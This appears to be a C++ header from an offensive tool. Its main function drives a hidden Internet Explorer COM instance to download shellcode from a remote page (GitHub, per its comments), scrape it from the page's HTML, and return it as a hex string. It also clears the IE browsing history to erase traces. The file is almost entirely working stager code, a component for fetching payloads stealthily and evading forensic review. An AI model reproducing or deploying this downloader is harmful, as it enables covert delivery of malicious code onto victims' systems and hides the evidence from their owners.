#pragma once

#include <Windows.h>
#include <objbase.h>
#include <exdisp.h>
#include <mshtml.h>
#include <Urlhist.h>
//#include <shlguid.h> // CLSID_CUrlHistory defined here
#include <string>
#include <algorithm>

#pragma comment(lib, "Ole32.lib")
#pragma comment(lib, "OleAut32.lib")

// Manually adding CUrlHistory GUID
#include <InitGuid.h>
DEFINE_GUID(CLSID_CUrlHistory, 0x3C374A40L, 0xBAE4, 0x11CF, 0xBF, 0x7D, 0x00, 0xAA, 0x00, 0x69, 0x46, 0xEE); // "{3C374A40-BAE4-11CF-BF7D-00AA006946EE}"

// To convert wide character string to multi byte string
// ------------------------------------------------------------------------

std::string convert_wcs_to_mbs(const wchar_t* pstr, long wslen) {
	int len = WideCharToMultiByte(CP_ACP, 0, pstr, wslen, NULL, 0, NULL, NULL);
	std::string dblstr(len, '\0');
    len = WideCharToMultiByte(CP_ACP, 0 /* no flags */,
                                pstr, wslen /* not necessary NULL-terminated */,
	&dblstr[0], len,
                                NULL, NULL /* no default char */);
	return dblstr;
}

// To convert binary string to multi byte string
// ------------------------------------------------------------------------

std::string convert_bstr_to_mbs(BSTR bstr) {
	int wslen = SysStringLen(bstr);
	return convert_wcs_to_mbs((wchar_t*)bstr, wslen);
}

// To download a shellcode from Github using IE COM object
// ------------------------------------------------------------------------

std::string download_to_mem_com(char* url) {
	// Disable IE First-use prompt - regplay.cpp

	// Initialize COM library
	CoInitialize(NULL);

    // Get IE class
    CLSID clsid;
	CLSIDFromProgID(OLESTR("InternetExplorer.Application"), &clsid);

	// Create an instance of IE
	IWebBrowser2* pWebBrowser;
	//CLSID CLSID_InternetExplorer = __uuidof(InternetExplorer);
	HRESULT hr = CoCreateInstance(clsid, NULL, CLSCTX_LOCAL_SERVER, IID_PPV_ARGS(&pWebBrowser));
    
    // Set Visibility to hidden
	HRESULT hrVis = pWebBrowser->put_Visible(VARIANT_FALSE);

    // Convert char to wchar_t
    const size_t cSize = strlen((const char*)url)+1;
    std::wstring wcUrl(cSize, L'#');
    mbstowcs(&wcUrl[0], url, cSize );

    // Allocate a binary string for download url
	BSTR bstrURL = SysAllocString(wcUrl.c_str());

	// Navigate to download URL
	VARIANT vEmpty;
	VARIANT_BOOL vBusy;
	VariantInit(&vEmpty);
	HRESULT hrNav = pWebBrowser->Navigate(bstrURL, &vEmpty, &vEmpty, &vEmpty, &vEmpty);
	
	// Wait for page to load
	do {
		Sleep(1);
		pWebBrowser->get_Busy(&vBusy);
	} while(vBusy);
	
	// Wait for additional 6 seconds - Bugfix
	Sleep(6000);

	// Get IDispatch interface
	IDispatch* pDispatch;
	HRESULT hrGetDoc = pWebBrowser->get_Document(&pDispatch);

	// Get IHTMLDocument2 interface
	IHTMLDocument2* pDocument;
	HRESULT hrQueryIface = pDispatch->QueryInterface(&pDocument);

	// Get IHTMLElement HTML Body element
	IHTMLElement* lpBodyElm;
	HRESULT hrGetBody = pDocument->get_body(&lpBodyElm);

    // Get IHTMLElement HTML Parent element
	IHTMLElement* lpParentElm;
	HRESULT hrGetParElm = lpBodyElm->get_parentElement(&lpParentElm);

	// Get Inner HTML content as a binary string
	BSTR bstrBody;
	HRESULT hrGetInrHTMl = lpParentElm->get_innerHTML(&bstrBody);

	// Convert the HTML source as a binary string to string
	std::string sHtmlSource = convert_bstr_to_mbs(bstrBody);

	// Delete IE browser history
	IUrlHistoryStg2* pIEHistory;

	hr = CoCreateInstance(CLSID_CUrlHistory, NULL, CLSCTX_INPROC, IID_PPV_ARGS(&pIEHistory));
	
	if (SUCCEEDED(hr)) {
		pIEHistory->ClearHistory();
		pIEHistory->Release();
	}

	// Cleanup
	SysFreeString(bstrURL);
	pWebBrowser->Quit();
	pWebBrowser->Release();
	pDispatch->Release();
	pDocument->Release();
	lpBodyElm->Release();
	lpParentElm->Release();
	CoUninitialize();

    // Check if we actually got the shellcode or not, return "" if not otherwise proceed
	if (!(sHtmlSource.find("<pre>") != std::string::npos)) {
		return "";
	}

    // Remove all the tags from the HTML source string
	while (sHtmlSource.find("<") != std::string::npos) {
		auto startpos = sHtmlSource.find("<");
		auto endpos = sHtmlSource.find(">") + 1;
		if (endpos != std::string::npos) {
			sHtmlSource.erase(startpos, endpos - startpos);
		}
	}

	// Remove the trailing newline character
	sHtmlSource.erase(remove(sHtmlSource.begin(), sHtmlSource.end(), '\n'), sHtmlSource.end());
	
	// Finally, return the shellcode hex string
	return sHtmlSource;
}